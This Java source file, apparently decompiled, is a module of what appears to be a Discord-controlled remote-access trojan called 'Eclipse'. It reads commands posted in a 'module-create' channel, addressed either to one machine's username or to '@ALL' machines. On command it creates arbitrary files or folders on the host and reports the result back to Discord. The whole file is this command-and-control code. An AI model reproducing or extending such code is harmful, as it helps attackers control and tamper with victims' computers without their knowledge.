package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.io.File;
import java.io.IOException;

import me.Eclipse.Brain;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class CreateModule {
    public static void run(MessageReceivedEvent var0) {
        Message var1 = var0.getMessage();
        if (var1.getChannel().getName().contains("module-create")) {
            if (var1.getContentDisplay().startsWith("!Create " + Brain.Username) || var1.getContentDisplay().startsWith("!Create @ALL")) {
                String var2 = var1.getContentDisplay().replaceFirst("!Create " + Brain.Username + " ", "").replaceFirst("!Create @ALL ", "");

                try {
                    if (var2.contains(".")) {
                        if ((new File(var2)).createNewFile()) {
                            Helper.sendMessage(Color.GREEN, "Module Create (" + Brain.Username + ")", "File `" + var2 + "` has been successfully created.", var0);
                        } else {
                            Helper.sendMessage(Color.RED, "Module Create (" + Brain.Username + ")", "Could not create file.", var0);
                        }
                    } else if (!(new File(var2)).exists()) {
                        (new File(var2)).mkdir();
                        Helper.sendMessage(Color.GREEN, "Module Create (" + Brain.Username + ")", "Folder `" + var2 + "` has been successfully created.", var0);
                    } else {
                        Helper.sendMessage(Color.RED, "Module Create (" + Brain.Username + ")", "Could not create folder.", var0);
                    }
                } catch (IOException var4) {
                    ;
                }
            }

        }
    }
}
